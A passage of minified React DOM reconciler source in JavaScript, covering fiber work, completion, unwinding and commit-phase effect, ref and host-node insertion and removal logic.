				var n = (e.flags & 128) !== 0;
				if (
					((a = (l & t.childLanes) !== 0),
					a || (Va(e, t, l, !1), (a = (l & t.childLanes) !== 0)),
					n)
				) {
					if (a) return nr(e, t, l);
					t.flags |= 128;
				}
				if (
					((n = t.memoizedState),
					n !== null &&
						((n.rendering = null),
						(n.tail = null),
						(n.lastEffect = null)),
					L(ze, ze.current),
					a)
				)
					break;
				return null;
			case 22:
			case 23:
				return (t.lanes = 0), Fs(e, t, l);
			case 24:
				It(t, Re, e.memoizedState.cache);
		}
		return Yt(e, t, l);
	}
	function ur(e, t, l) {
		if (e !== null)
			if (e.memoizedProps !== t.pendingProps) He = !0;
			else {
				if (!Ti(e, l) && (t.flags & 128) === 0)
					return (He = !1), w9(e, t, l);
				He = (e.flags & 131072) !== 0;
			}
		else (He = !1), se && (t.flags & 1048576) !== 0 && Uf(t, en, t.index);
		switch (((t.lanes = 0), t.tag)) {
			case 16:
				e: {
					e = t.pendingProps;
					var a = t.elementType,
						n = a._init;
					if (
						((a = n(a._payload)),
						(t.type = a),
						typeof a == "function")
					)
						Uu(a)
							? ((e = Hl(a, e)),
							  (t.tag = 1),
							  (t = er(null, t, a, e, l)))
							: ((t.tag = 0), (t = yi(null, t, a, e, l)));
					else {
						if (a != null) {
							if (((n = a.$$typeof), n === be)) {
								(t.tag = 11), (t = Js(null, t, a, e, l));
								break e;
							} else if (n === Oe) {
								(t.tag = 14), (t = $s(null, t, a, e, l));
								break e;
							}
						}
						throw ((t = Cl(a) || a), Error(r(306, t, "")));
					}
				}
				return t;
			case 0:
				return yi(e, t, t.type, t.pendingProps, l);
			case 1:
				return (
					(a = t.type), (n = Hl(a, t.pendingProps)), er(e, t, a, n, l)
				);
			case 3:
				e: {
					if ((ve(t, t.stateNode.containerInfo), e === null))
						throw Error(r(387));
					a = t.pendingProps;
					var u = t.memoizedState;
					(n = u.element), $u(e, t), Pa(t, a, null, l);
					var i = t.memoizedState;
					if (
						((a = i.cache),
						It(t, Re, a),
						a !== u.cache && Xu(t, [Re], l, !0),
						Fa(),
						(a = i.element),
						u.isDehydrated)
					)
						if (
							((u = {
								element: a,
								isDehydrated: !1,
								cache: i.cache,
							}),
							(t.updateQueue.baseState = u),
							(t.memoizedState = u),
							t.flags & 256)
						) {
							t = tr(e, t, a, l);
							break e;
						} else if (a !== n) {
							(n = ht(Error(r(424)), t)),
								Qa(n),
								(t = tr(e, t, a, l));
							break e;
						} else {
							switch (
								((e = t.stateNode.containerInfo), e.nodeType)
							) {
								case 9:
									e = e.body;
									break;
								default:
									e =
										e.nodeName === "HTML"
											? e.ownerDocument.body
											: e;
							}
							for (
								je = St(e.firstChild),
									Ke = t,
									se = !0,
									Ol = null,
									jt = !0,
									l = Ls(t, null, a, l),
									t.child = l;
								l;

							)
								(l.flags = (l.flags & -3) | 4096),
									(l = l.sibling);
						}
					else {
						if ((Xa(), a === n)) {
							t = Yt(e, t, l);
							break e;
						}
						qe(e, t, a, l);
					}
					t = t.child;
				}
				return t;
			case 26:
				return (
					Cn(e, t),
					e === null
						? (l = s2(t.type, null, t.pendingProps, null))
							? (t.memoizedState = l)
							: se ||
							  ((l = t.type),
							  (e = t.pendingProps),
							  (a = Hn(P.current).createElement(l)),
							  (a[Qe] = t),
							  (a[Je] = e),
							  Ge(a, l, e),
							  Ue(a),
							  (t.stateNode = a))
						: (t.memoizedState = s2(
								t.type,
								e.memoizedProps,
								t.pendingProps,
								e.memoizedState
						  )),
					null
				);
			case 27:
				return (
					tu(t),
					e === null &&
						se &&
						((a = t.stateNode =
							i2(t.type, t.pendingProps, P.current)),
						(Ke = t),
						(jt = !0),
						(n = je),
						ml(t.type)
							? ((ic = n), (je = St(a.firstChild)))
							: (je = n)),
					qe(e, t, t.pendingProps.children, l),
					Cn(e, t),
					e === null && (t.flags |= 4194304),
					t.child
				);
			case 5:
				return (
					e === null &&
						se &&
						((n = a = je) &&
							((a = l0(a, t.type, t.pendingProps, jt)),
							a !== null
								? ((t.stateNode = a),
								  (Ke = t),
								  (je = St(a.firstChild)),
								  (jt = !1),
								  (n = !0))
								: (n = !1)),
						n || Rl(t)),
					tu(t),
					(n = t.type),
					(u = t.pendingProps),
					(i = e !== null ? e.memoizedProps : null),
					(a = u.children),
					lc(n, u)
						? (a = null)
						: i !== null && lc(n, i) && (t.flags |= 32),
					t.memoizedState !== null &&
						((n = ti(e, t, b9, null, null, l)),
						(b1._currentValue = n)),
					Cn(e, t),
					qe(e, t, a, l),
					t.child
				);
			case 6:
				return (
					e === null &&
						se &&
						((e = l = je) &&
							((l = a0(l, t.pendingProps, jt)),
							l !== null
								? ((t.stateNode = l),
								  (Ke = t),
								  (je = null),
								  (e = !0))
								: (e = !1)),
						e || Rl(t)),
					null
				);
			case 13:
				return lr(e, t, l);
			case 4:
				return (
					ve(t, t.stateNode.containerInfo),
					(a = t.pendingProps),
					e === null ? (t.child = da(t, null, a, l)) : qe(e, t, a, l),
					t.child
				);
			case 11:
				return Js(e, t, t.type, t.pendingProps, l);
			case 7:
				return qe(e, t, t.pendingProps, l), t.child;
			case 8:
				return qe(e, t, t.pendingProps.children, l), t.child;
			case 12:
				return qe(e, t, t.pendingProps.children, l), t.child;
			case 10:
				return (
					(a = t.pendingProps),
					It(t, t.type, a.value),
					qe(e, t, a.children, l),
					t.child
				);
			case 9:
				return (
					(n = t.type._context),
					(a = t.pendingProps.children),
					_l(t),
					(n = Ve(n)),
					(a = a(n)),
					(t.flags |= 1),
					qe(e, t, a, l),
					t.child
				);
			case 14:
				return $s(e, t, t.type, t.pendingProps, l);
			case 15:
				return Ws(e, t, t.type, t.pendingProps, l);
			case 19:
				return nr(e, t, l);
			case 31:
				return (
					(a = t.pendingProps),
					(l = t.mode),
					(a = { mode: a.mode, children: a.children }),
					e === null
						? ((l = Sn(a, l)),
						  (l.ref = t.ref),
						  (t.child = l),
						  (l.return = t),
						  (t = l))
						: ((l = _t(e.child, a)),
						  (l.ref = t.ref),
						  (t.child = l),
						  (l.return = t),
						  (t = l)),
					t
				);
			case 22:
				return Fs(e, t, l);
			case 24:
				return (
					_l(t),
					(a = Ve(Re)),
					e === null
						? ((n = ku()),
						  n === null &&
								((n = ge),
								(u = Qu()),
								(n.pooledCache = u),
								u.refCount++,
								u !== null && (n.pooledCacheLanes |= l),
								(n = u)),
						  (t.memoizedState = { parent: a, cache: n }),
						  Ju(t),
						  It(t, Re, n))
						: ((e.lanes & l) !== 0 &&
								($u(e, t), Pa(t, null, null, l), Fa()),
						  (n = e.memoizedState),
						  (u = t.memoizedState),
						  n.parent !== a
								? ((n = { parent: a, cache: a }),
								  (t.memoizedState = n),
								  t.lanes === 0 &&
										(t.memoizedState =
											t.updateQueue.baseState =
												n),
								  It(t, Re, a))
								: ((a = u.cache),
								  It(t, Re, a),
								  a !== n.cache && Xu(t, [Re], l, !0))),
					qe(e, t, t.pendingProps.children, l),
					t.child
				);
			case 29:
				throw t.pendingProps;
		}
		throw Error(r(156, t.tag));
	}
	function Gt(e) {
		e.flags |= 4;
	}
	function ir(e, t) {
		if (t.type !== "stylesheet" || (t.state.loading & 4) !== 0)
			e.flags &= -16777217;
		else if (((e.flags |= 16777216), !m2(t))) {
			if (
				((t = gt.current),
				t !== null &&
					((ue & 4194048) === ue
						? Nt !== null
						: ((ue & 62914560) !== ue && (ue & 536870912) === 0) ||
						  t !== Nt))
			)
				throw (($a = Ku), Xf);
			e.flags |= 8192;
		}
	}
	function En(e, t) {
		t !== null && (e.flags |= 4),
			e.flags & 16384 &&
				((t = e.tag !== 22 ? Lc() : 536870912),
				(e.lanes |= t),
				(xa |= t));
	}
	function u1(e, t) {
		if (!se)
			switch (e.tailMode) {
				case "hidden":
					t = e.tail;
					for (var l = null; t !== null; )
						t.alternate !== null && (l = t), (t = t.sibling);
					l === null ? (e.tail = null) : (l.sibling = null);
					break;
				case "collapsed":
					l = e.tail;
					for (var a = null; l !== null; )
						l.alternate !== null && (a = l), (l = l.sibling);
					a === null
						? t || e.tail === null
							? (e.tail = null)
							: (e.tail.sibling = null)
						: (a.sibling = null);
			}
	}
	function Ce(e) {
		var t = e.alternate !== null && e.alternate.child === e.child,
			l = 0,
			a = 0;
		if (t)
			for (var n = e.child; n !== null; )
				(l |= n.lanes | n.childLanes),
					(a |= n.subtreeFlags & 65011712),
					(a |= n.flags & 65011712),
					(n.return = e),
					(n = n.sibling);
		else
			for (n = e.child; n !== null; )
				(l |= n.lanes | n.childLanes),
					(a |= n.subtreeFlags),
					(a |= n.flags),
					(n.return = e),
					(n = n.sibling);
		return (e.subtreeFlags |= a), (e.childLanes = l), t;
	}
	function M9(e, t, l) {
		var a = t.pendingProps;
		switch ((qu(t), t.tag)) {
			case 31:
			case 16:
			case 15:
			case 0:
			case 11:
			case 7:
			case 8:
			case 12:
			case 9:
			case 14:
				return Ce(t), null;
			case 1:
				return Ce(t), null;
			case 3:
				return (
					(l = t.stateNode),
					(a = null),
					e !== null && (a = e.memoizedState.cache),
					t.memoizedState.cache !== a && (t.flags |= 2048),
					Lt(Re),
					$t(),
					l.pendingContext &&
						((l.context = l.pendingContext),
						(l.pendingContext = null)),
					(e === null || e.child === null) &&
						(Za(t)
							? Gt(t)
							: e === null ||
							  (e.memoizedState.isDehydrated &&
									(t.flags & 256) === 0) ||
							  ((t.flags |= 1024), Bf())),
					Ce(t),
					null
				);
			case 26:
				return (
					(l = t.memoizedState),
					e === null
						? (Gt(t),
						  l !== null
								? (Ce(t), ir(t, l))
								: (Ce(t), (t.flags &= -16777217)))
						: l
						? l !== e.memoizedState
							? (Gt(t), Ce(t), ir(t, l))
							: (Ce(t), (t.flags &= -16777217))
						: (e.memoizedProps !== a && Gt(t),
						  Ce(t),
						  (t.flags &= -16777217)),
					null
				);
			case 27:
				_1(t), (l = P.current);
				var n = t.type;
				if (e !== null && t.stateNode != null)
					e.memoizedProps !== a && Gt(t);
				else {
					if (!a) {
						if (t.stateNode === null) throw Error(r(166));
						return Ce(t), null;
					}
					(e = V.current),
						Za(t)
							? Hf(t)
							: ((e = i2(n, a, l)), (t.stateNode = e), Gt(t));
				}
				return Ce(t), null;
			case 5:
				if ((_1(t), (l = t.type), e !== null && t.stateNode != null))
					e.memoizedProps !== a && Gt(t);
				else {
					if (!a) {
						if (t.stateNode === null) throw Error(r(166));
						return Ce(t), null;
					}
					if (((e = V.current), Za(t))) Hf(t);
					else {
						switch (((n = Hn(P.current)), e)) {
							case 1:
								e = n.createElementNS(
									"http://www.w3.org/2000/svg",
									l
								);
								break;
							case 2:
								e = n.createElementNS(
									"http://www.w3.org/1998/Math/MathML",
									l
								);
								break;
							default:
								switch (l) {
									case "svg":
										e = n.createElementNS(
											"http://www.w3.org/2000/svg",
											l
										);
										break;
									case "math":
										e = n.createElementNS(
											"http://www.w3.org/1998/Math/MathML",
											l
										);
										break;
									case "script":
										(e = n.createElement("div")),
											(e.innerHTML = "<script></script>"),
											(e = e.removeChild(e.firstChild));
										break;
									case "select":
										(e =
											typeof a.is == "string"
												? n.createElement("select", {
														is: a.is,
												  })
												: n.createElement("select")),
											a.multiple
												? (e.multiple = !0)
												: a.size && (e.size = a.size);
										break;
									default:
										e =
											typeof a.is == "string"
												? n.createElement(l, {
														is: a.is,
												  })
												: n.createElement(l);
								}
						}
						(e[Qe] = t), (e[Je] = a);
						e: for (n = t.child; n !== null; ) {
							if (n.tag === 5 || n.tag === 6)
								e.appendChild(n.stateNode);
							else if (
								n.tag !== 4 &&
								n.tag !== 27 &&
								n.child !== null
							) {
								(n.child.return = n), (n = n.child);
								continue;
							}
							if (n === t) break e;
							for (; n.sibling === null; ) {
								if (n.return === null || n.return === t)
									break e;
								n = n.return;
							}
							(n.sibling.return = n.return), (n = n.sibling);
						}
						t.stateNode = e;
						e: switch ((Ge(e, l, a), l)) {
							case "button":
							case "input":
							case "select":
							case "textarea":
								e = !!a.autoFocus;
								break e;
							case "img":
								e = !0;
								break e;
							default:
								e = !1;
						}
						e && Gt(t);
					}
				}
				return Ce(t), (t.flags &= -16777217), null;
			case 6:
				if (e && t.stateNode != null) e.memoizedProps !== a && Gt(t);
				else {
					if (typeof a != "string" && t.stateNode === null)
						throw Error(r(166));
					if (((e = P.current), Za(t))) {
						if (
							((e = t.stateNode),
							(l = t.memoizedProps),
							(a = null),
							(n = Ke),
							n !== null)
						)
							switch (n.tag) {
								case 27:
								case 5:
									a = n.memoizedProps;
							}
						(e[Qe] = t),
							(e = !!(
								e.nodeValue === l ||
								(a !== null &&
									a.suppressHydrationWarning === !0) ||
								Ir(e.nodeValue, l)
							)),
							e || Rl(t);
					} else
						(e = Hn(e).createTextNode(a)),
							(e[Qe] = t),
							(t.stateNode = e);
				}
				return Ce(t), null;
			case 13:
				if (
					((a = t.memoizedState),
					e === null ||
						(e.memoizedState !== null &&
							e.memoizedState.dehydrated !== null))
				) {
					if (((n = Za(t)), a !== null && a.dehydrated !== null)) {
						if (e === null) {
							if (!n) throw Error(r(318));
							if (
								((n = t.memoizedState),
								(n = n !== null ? n.dehydrated : null),
								!n)
							)
								throw Error(r(317));
							n[Qe] = t;
						} else
							Xa(),
								(t.flags & 128) === 0 &&
									(t.memoizedState = null),
								(t.flags |= 4);
						Ce(t), (n = !1);
					} else
						(n = Bf()),
							e !== null &&
								e.memoizedState !== null &&
								(e.memoizedState.hydrationErrors = n),
							(n = !0);
					if (!n) return t.flags & 256 ? (qt(t), t) : (qt(t), null);
				}
				if ((qt(t), (t.flags & 128) !== 0)) return (t.lanes = l), t;
				if (
					((l = a !== null),
					(e = e !== null && e.memoizedState !== null),
					l)
				) {
					(a = t.child),
						(n = null),
						a.alternate !== null &&
							a.alternate.memoizedState !== null &&
							a.alternate.memoizedState.cachePool !== null &&
							(n = a.alternate.memoizedState.cachePool.pool);
					var u = null;
					a.memoizedState !== null &&
						a.memoizedState.cachePool !== null &&
						(u = a.memoizedState.cachePool.pool),
						u !== n && (a.flags |= 2048);
				}
				return (
					l !== e && l && (t.child.flags |= 8192),
					En(t, t.updateQueue),
					Ce(t),
					null
				);
			case 4:
				return (
					$t(),
					e === null && Fi(t.stateNode.containerInfo),
					Ce(t),
					null
				);
			case 10:
				return Lt(t.type), Ce(t), null;
			case 19:
				if ((q(ze), (n = t.memoizedState), n === null))
					return Ce(t), null;
				if (
					((a = (t.flags & 128) !== 0), (u = n.rendering), u === null)
				)
					if (a) u1(n, !1);
					else {
						if (Ne !== 0 || (e !== null && (e.flags & 128) !== 0))
							for (e = t.child; e !== null; ) {
								if (((u = vn(e)), u !== null)) {
									for (
										t.flags |= 128,
											u1(n, !1),
											e = u.updateQueue,
											t.updateQueue = e,
											En(t, e),
											t.subtreeFlags = 0,
											e = l,
											l = t.child;
										l !== null;

									)
										Df(l, e), (l = l.sibling);
									return L(ze, (ze.current & 1) | 2), t.child;
								}
								e = e.sibling;
							}
						n.tail !== null &&
							Et() > Tn &&
							((t.flags |= 128),
							(a = !0),
							u1(n, !1),
							(t.lanes = 4194304));
					}
				else {
					if (!a)
						if (((e = vn(u)), e !== null)) {
							if (
								((t.flags |= 128),
								(a = !0),
								(e = e.updateQueue),
								(t.updateQueue = e),
								En(t, e),
								u1(n, !0),
								n.tail === null &&
									n.tailMode === "hidden" &&
									!u.alternate &&
									!se)
							)
								return Ce(t), null;
						} else
							2 * Et() - n.renderingStartTime > Tn &&
								l !== 536870912 &&
								((t.flags |= 128),
								(a = !0),
								u1(n, !1),
								(t.lanes = 4194304));
					n.isBackwards
						? ((u.sibling = t.child), (t.child = u))
						: ((e = n.last),
						  e !== null ? (e.sibling = u) : (t.child = u),
						  (n.last = u));
				}
				return n.tail !== null
					? ((t = n.tail),
					  (n.rendering = t),
					  (n.tail = t.sibling),
					  (n.renderingStartTime = Et()),
					  (t.sibling = null),
					  (e = ze.current),
					  L(ze, a ? (e & 1) | 2 : e & 1),
					  t)
					: (Ce(t), null);
			case 22:
			case 23:
				return (
					qt(t),
					Iu(),
					(a = t.memoizedState !== null),
					e !== null
						? (e.memoizedState !== null) !== a && (t.flags |= 8192)
						: a && (t.flags |= 8192),
					a
						? (l & 536870912) !== 0 &&
						  (t.flags & 128) === 0 &&
						  (Ce(t), t.subtreeFlags & 6 && (t.flags |= 8192))
						: Ce(t),
					(l = t.updateQueue),
					l !== null && En(t, l.retryQueue),
					(l = null),
					e !== null &&
						e.memoizedState !== null &&
						e.memoizedState.cachePool !== null &&
						(l = e.memoizedState.cachePool.pool),
					(a = null),
					t.memoizedState !== null &&
						t.memoizedState.cachePool !== null &&
						(a = t.memoizedState.cachePool.pool),
					a !== l && (t.flags |= 2048),
					e !== null && q(Dl),
					null
				);
			case 24:
				return (
					(l = null),
					e !== null && (l = e.memoizedState.cache),
					t.memoizedState.cache !== l && (t.flags |= 2048),
					Lt(Re),
					Ce(t),
					null
				);
			case 25:
				return null;
			case 30:
				return null;
		}
		throw Error(r(156, t.tag));
	}
	function O9(e, t) {
		switch ((qu(t), t.tag)) {
			case 1:
				return (
					(e = t.flags),
					e & 65536 ? ((t.flags = (e & -65537) | 128), t) : null
				);
			case 3:
				return (
					Lt(Re),
					$t(),
					(e = t.flags),
					(e & 65536) !== 0 && (e & 128) === 0
						? ((t.flags = (e & -65537) | 128), t)
						: null
				);
			case 26:
			case 27:
			case 5:
				return _1(t), null;
			case 13:
				if (
					(qt(t),
					(e = t.memoizedState),
					e !== null && e.dehydrated !== null)
				) {
					if (t.alternate === null) throw Error(r(340));
					Xa();
				}
				return (
					(e = t.flags),
					e & 65536 ? ((t.flags = (e & -65537) | 128), t) : null
				);
			case 19:
				return q(ze), null;
			case 4:
				return $t(), null;
			case 10:
				return Lt(t.type), null;
			case 22:
			case 23:
				return (
					qt(t),
					Iu(),
					e !== null && q(Dl),
					(e = t.flags),
					e & 65536 ? ((t.flags = (e & -65537) | 128), t) : null
				);
			case 24:
				return Lt(Re), null;
			case 25:
				return null;
			default:
				return null;
		}
	}
	function cr(e, t) {
		switch ((qu(t), t.tag)) {
			case 3:
				Lt(Re), $t();
				break;
			case 26:
			case 27:
			case 5:
				_1(t);
				break;
			case 4:
				$t();
				break;
			case 13:
				qt(t);
				break;
			case 19:
				q(ze);
				break;
			case 10:
				Lt(t.type);
				break;
			case 22:
			case 23:
				qt(t), Iu(), e !== null && q(Dl);
				break;
			case 24:
				Lt(Re);
		}
	}
	function i1(e, t) {
		try {
			var l = t.updateQueue,
				a = l !== null ? l.lastEffect : null;
			if (a !== null) {
				var n = a.next;
				l = n;
				do {
					if ((l.tag & e) === e) {
						a = void 0;
						var u = l.create,
							i = l.inst;
						(a = u()), (i.destroy = a);
					}
					l = l.next;
				} while (l !== n);
			}
		} catch (s) {
			xe(t, t.return, s);
		}
	}
	function il(e, t, l) {
		try {
			var a = t.updateQueue,
				n = a !== null ? a.lastEffect : null;
			if (n !== null) {
				var u = n.next;
				a = u;
				do {
					if ((a.tag & e) === e) {
						var i = a.inst,
							s = i.destroy;
						if (s !== void 0) {
							(i.destroy = void 0), (n = t);
							var m = l,
								S = s;
							try {
								S();
							} catch (T) {
								xe(n, m, T);
							}
						}
					}
					a = a.next;
				} while (a !== u);
			}
		} catch (T) {
			xe(t, t.return, T);
		}
	}
	function fr(e) {
		var t = e.updateQueue;
		if (t !== null) {
			var l = e.stateNode;
			try {
				$f(t, l);
			} catch (a) {
				xe(e, e.return, a);
			}
		}
	}
	function sr(e, t, l) {
		(l.props = Hl(e.type, e.memoizedProps)), (l.state = e.memoizedState);
		try {
			l.componentWillUnmount();
		} catch (a) {
			xe(e, t, a);
		}
	}
	function c1(e, t) {
		try {
			var l = e.ref;
			if (l !== null) {
				switch (e.tag) {
					case 26:
					case 27:
					case 5:
						var a = e.stateNode;
						break;
					case 30:
						a = e.stateNode;
						break;
					default:
						a = e.stateNode;
				}
				typeof l == "function"
					? (e.refCleanup = l(a))
					: (l.current = a);
			}
		} catch (n) {
			xe(e, t, n);
		}
	}
	function Tt(e, t) {
		var l = e.ref,
			a = e.refCleanup;
		if (l !== null)
			if (typeof a == "function")
				try {
					a();
				} catch (n) {
					xe(e, t, n);
				} finally {
					(e.refCleanup = null),
						(e = e.alternate),
						e != null && (e.refCleanup = null);
				}
			else if (typeof l == "function")
				try {
					l(null);
				} catch (n) {
					xe(e, t, n);
				}
			else l.current = null;
	}
	function rr(e) {
		var t = e.type,
			l = e.memoizedProps,
			a = e.stateNode;
		try {
			e: switch (t) {
				case "button":
				case "input":
				case "select":
				case "textarea":
					l.autoFocus && a.focus();
					break e;
				case "img":
					l.src ? (a.src = l.src) : l.srcSet && (a.srcset = l.srcSet);
			}
		} catch (n) {
			xe(e, e.return, n);
		}
	}
	function Ai(e, t, l) {
		try {
			var a = e.stateNode;
			F9(a, e.type, l, t), (a[Je] = t);
		} catch (n) {
			xe(e, e.return, n);
		}
	}
	function or(e) {
		return (
			e.tag === 5 ||
			e.tag === 3 ||
			e.tag === 26 ||
			(e.tag === 27 && ml(e.type)) ||
			e.tag === 4
		);
	}
	function wi(e) {
		e: for (;;) {
			for (; e.sibling === null; ) {
				if (e.return === null || or(e.return)) return null;
				e = e.return;
			}
			for (
				e.sibling.return = e.return, e = e.sibling;
				e.tag !== 5 && e.tag !== 6 && e.tag !== 18;

			) {
				if (
					(e.tag === 27 && ml(e.type)) ||
					e.flags & 2 ||
					e.child === null ||
					e.tag === 4
				)
					continue e;
				(e.child.return = e), (e = e.child);
			}
			if (!(e.flags & 2)) return e.stateNode;
		}
	}
	function Mi(e, t, l) {
		var a = e.tag;
		if (a === 5 || a === 6)
			(e = e.stateNode),
				t
					? (l.nodeType === 9
							? l.body
							: l.nodeName === "HTML"
							? l.ownerDocument.body
							: l
					  ).insertBefore(e, t)
					: ((t =
							l.nodeType === 9
								? l.body
								: l.nodeName === "HTML"
								? l.ownerDocument.body
								: l),
					  t.appendChild(e),
					  (l = l._reactRootContainer),
					  l != null || t.onclick !== null || (t.onclick = Un));
		else if (
			a !== 4 &&
			(a === 27 && ml(e.type) && ((l = e.stateNode), (t = null)),
			(e = e.child),
			e !== null)
		)
			for (Mi(e, t, l), e = e.sibling; e !== null; )
				Mi(e, t, l), (e = e.sibling);
	}
	function jn(e, t, l) {
		var a = e.tag;
		if (a === 5 || a === 6)
			(e = e.stateNode), t ? l.insertBefore(e, t) : l.appendChild(e);
		else if (
			a !== 4 &&
			(a === 27 && ml(e.type) && (l = e.stateNode),
			(e = e.child),
			e !== null)
		)
			for (jn(e, t, l), e = e.sibling; e !== null; )
				jn(e, t, l), (e = e.sibling);
	}
	function dr(e) {
		var t = e.stateNode,
			l = e.memoizedProps;
		try {
			for (var a = e.type, n = t.attributes; n.length; )
				t.removeAttributeNode(n[0]);
			Ge(t, a, l), (t[Qe] = e), (t[Je] = l);
		} catch (u) {
			xe(e, e.return, u);
		}
	}
	var Zt = !1,
		Ae = !1,
		Oi = !1,
		hr = typeof WeakSet == "function" ? WeakSet : Set,
		Le = null;
	function R9(e, t) {
		if (((e = e.containerInfo), (ec = Zn), (e = jf(e)), wu(e))) {
			if ("selectionStart" in e)
				var l = { start: e.selectionStart, end: e.selectionEnd };
			else
				e: {
					l = ((l = e.ownerDocument) && l.defaultView) || window;
					var a = l.getSelection && l.getSelection();
					if (a && a.rangeCount !== 0) {
						l = a.anchorNode;
						var n = a.anchorOffset,
							u = a.focusNode;
						a = a.focusOffset;
						try {
							l.nodeType, u.nodeType;
						} catch {
							l = null;
							break e;
						}
						var i = 0,
							s = -1,
							m = -1,
							S = 0,
							T = 0,
							R = e,
							E = null;
						t: for (;;) {
							for (
								var j;
								R !== l ||
									(n !== 0 && R.nodeType !== 3) ||
									(s = i + n),
									R !== u ||
										(a !== 0 && R.nodeType !== 3) ||
										(m = i + a),
									R.nodeType === 3 &&
										(i += R.nodeValue.length),
									(j = R.firstChild) !== null;

							)
								(E = R), (R = j);
							for (;;) {
								if (R === e) break t;
								if (
									(E === l && ++S === n && (s = i),
									E === u && ++T === a && (m = i),
									(j = R.nextSibling) !== null)
								)
									break;
								(R = E), (E = R.parentNode);
							}
							R = j;
						}
						l = s === -1 || m === -1 ? null : { start: s, end: m };
					} else l = null;
				}
			l = l || { start: 0, end: 0 };
		} else l = null;
		for (
			tc = { focusedElem: e, selectionRange: l }, Zn = !1, Le = t;
			Le !== null;

		)
			if (
				((t = Le),
				(e = t.child),
				(t.subtreeFlags & 1024) !== 0 && e !== null)
			)
				(e.return = t), (Le = e);
			else
				for (; Le !== null; ) {
					switch (
						((t = Le), (u = t.alternate), (e = t.flags), t.tag)
					) {
						case 0:
							break;
						case 11:
						case 15:
							break;
						case 1:
							if ((e & 1024) !== 0 && u !== null) {
								(e = void 0),
									(l = t),
									(n = u.memoizedProps),
									(u = u.memoizedState),
									(a = l.stateNode);
								try {
									var W = Hl(
										l.type,
										n,
										l.elementType === l.type
									);
									(e = a.getSnapshotBeforeUpdate(W, u)),
										(a.__reactInternalSnapshotBeforeUpdate =
											e);
								} catch (k) {
									xe(l, l.return, k);
								}
							}
							break;
						case 3:
							if ((e & 1024) !== 0) {
								if (
									((e = t.stateNode.containerInfo),
									(l = e.nodeType),
									l === 9)
								)
									nc(e);
								else if (l === 1)
									switch (e.nodeName) {
										case "HEAD":
										case "HTML":
										case "BODY":
											nc(e);
											break;
										default:
											e.textContent = "";
									}
							}
							break;
						case 5:
						case 26:
						case 27:
						case 6:
						case 4:
						case 17:
							break;
						default:
							if ((e & 1024) !== 0) throw Error(r(163));
					}
					if (((e = t.sibling), e !== null)) {
						(e.return = t.return), (Le = e);
						break;
					}
					Le = t.return;
				}
	}
	function mr(e, t, l) {
		var a = l.flags;
		switch (l.tag) {
			case 0:
			case 11:
			case 15:
				cl(e, l), a & 4 && i1(5, l);
				break;
			case 1:
				if ((cl(e, l), a & 4))
					if (((e = l.stateNode), t === null))
						try {
							e.componentDidMount();
						} catch (i) {
							xe(l, l.return, i);
						}
					else {
						var n = Hl(l.type, t.memoizedProps);
						t = t.memoizedState;
						try {
							e.componentDidUpdate(
								n,
								t,
								e.__reactInternalSnapshotBeforeUpdate
							);
						} catch (i) {
							xe(l, l.return, i);
						}
					}
				a & 64 && fr(l), a & 512 && c1(l, l.return);
				break;
			case 3:
				if ((cl(e, l), a & 64 && ((e = l.updateQueue), e !== null))) {
					if (((t = null), l.child !== null))
						switch (l.child.tag) {
							case 27:
							case 5:
								t = l.child.stateNode;
								break;
							case 1:
								t = l.child.stateNode;
						}
					try {
						$f(e, t);
					} catch (i) {
						xe(l, l.return, i);
					}
				}
				break;
			case 27:
				t === null && a & 4 && dr(l);
			case 26:
			case 5:
				cl(e, l),
					t === null && a & 4 && rr(l),
					a & 512 && c1(l, l.return);
				break;
			case 12:
				cl(e, l);
				break;
			case 13:
				cl(e, l),
					a & 4 && gr(e, l),
					a & 64 &&
						((e = l.memoizedState),
						e !== null &&
							((e = e.dehydrated),
							e !== null && ((l = Y9.bind(null, l)), n0(e, l))));
				break;
			case 22:
				if (((a = l.memoizedState !== null || Zt), !a)) {
					(t = (t !== null && t.memoizedState !== null) || Ae),
						(n = Zt);
					var u = Ae;
					(Zt = a),
						(Ae = t) && !u
							? fl(e, l, (l.subtreeFlags & 8772) !== 0)
							: cl(e, l),
						(Zt = n),
						(Ae = u);
				}
				break;
			case 30:
				break;
			default:
				cl(e, l);
		}
	}
	function pr(e) {
		var t = e.alternate;
		t !== null && ((e.alternate = null), pr(t)),
			(e.child = null),
			(e.deletions = null),
			(e.sibling = null),
			e.tag === 5 && ((t = e.stateNode), t !== null && su(t)),
			(e.stateNode = null),
			(e.return = null),
			(e.dependencies = null),
			(e.memoizedProps = null),
			(e.memoizedState = null),
			(e.pendingProps = null),
			(e.stateNode = null),
			(e.updateQueue = null);
	}
	var ye = null,
		Fe = !1;
	function Xt(e, t, l) {
		for (l = l.child; l !== null; ) xr(e, t, l), (l = l.sibling);
	}
	function xr(e, t, l) {
		if (tt && typeof tt.onCommitFiberUnmount == "function")
			try {
				tt.onCommitFiberUnmount(wa, l);
			} catch {}
		switch (l.tag) {
			case 26:
				Ae || Tt(l, t),
					Xt(e, t, l),
					l.memoizedState
						? l.memoizedState.count--
						: l.stateNode &&
						  ((l = l.stateNode), l.parentNode.removeChild(l));
				break;
			case 27:
				Ae || Tt(l, t);
				var a = ye,
					n = Fe;
				ml(l.type) && ((ye = l.stateNode), (Fe = !1)),
					Xt(e, t, l),
					x1(l.stateNode),
					(ye = a),
					(Fe = n);
				break;
			case 5:
				Ae || Tt(l, t);
			case 6:
				if (
					((a = ye),
					(n = Fe),
					(ye = null),
					Xt(e, t, l),
					(ye = a),
					(Fe = n),
					ye !== null)
				)
					if (Fe)
						try {
							(ye.nodeType === 9
								? ye.body
								: ye.nodeName === "HTML"
								? ye.ownerDocument.body
								: ye
							).removeChild(l.stateNode);
						} catch (u) {
							xe(l, t, u);
						}
					else
						try {
							ye.removeChild(l.stateNode);
						} catch (u) {
							xe(l, t, u);
						}
				break;
			case 18:
				ye !== null &&
					(Fe
						? ((e = ye),
						  n2(
								e.nodeType === 9
									? e.body
									: e.nodeName === "HTML"
									? e.ownerDocument.body
									: e,
								l.stateNode
						  ),
						  j1(e))
						: n2(ye, l.stateNode));
				break;
			case 4:
				(a = ye),
					(n = Fe),
					(ye = l.stateNode.containerInfo),
					(Fe = !0),
					Xt(e, t, l),
					(ye = a),
					(Fe = n);
				break;
			case 0:
			case 11:
			case 14:
			case 15:
				Ae || il(2, l, t), Ae || il(4, l, t), Xt(e, t, l);
				break;
			case 1:
				Ae ||
					(Tt(l, t),
					(a = l.stateNode),
					typeof a.componentWillUnmount == "function" && sr(l, t, a)),
					Xt(e, t, l);
				break;
			case 21:
				Xt(e, t, l);
				break;
			case 22:
